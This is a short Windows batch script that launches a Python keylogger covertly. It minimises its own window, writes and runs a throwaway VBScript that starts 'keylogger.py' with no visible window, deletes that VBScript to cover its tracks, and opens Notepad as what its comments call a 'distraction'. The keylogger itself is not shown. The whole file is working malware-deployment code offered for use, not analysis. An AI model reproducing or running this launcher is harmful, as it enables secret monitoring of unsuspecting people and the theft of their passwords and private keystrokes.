@echo off
:: Hide this batch window completely
if not DEFINED IS_MINIMIZED set IS_MINIMIZED=1 && start "" /min "%~dpnx0" %* && exit

:: Set current directory to batch file location
cd /d "%~dp0"

:: Create VBS script to run the keylogger invisibly
echo Set WshShell = CreateObject("WScript.Shell") > run_hidden.vbs
echo WshShell.Run chr(34) ^& "%~dp0keylogger.py" ^& chr(34), 0, False >> run_hidden.vbs

:: Run the VBS script
start /b "" wscript.exe run_hidden.vbs

:: Delete the VBS script after running
timeout /t 2 /nobreak > nul
del run_hidden.vbs

:: Create distraction - open a fake application
start notepad

:: Exit batch script
exit 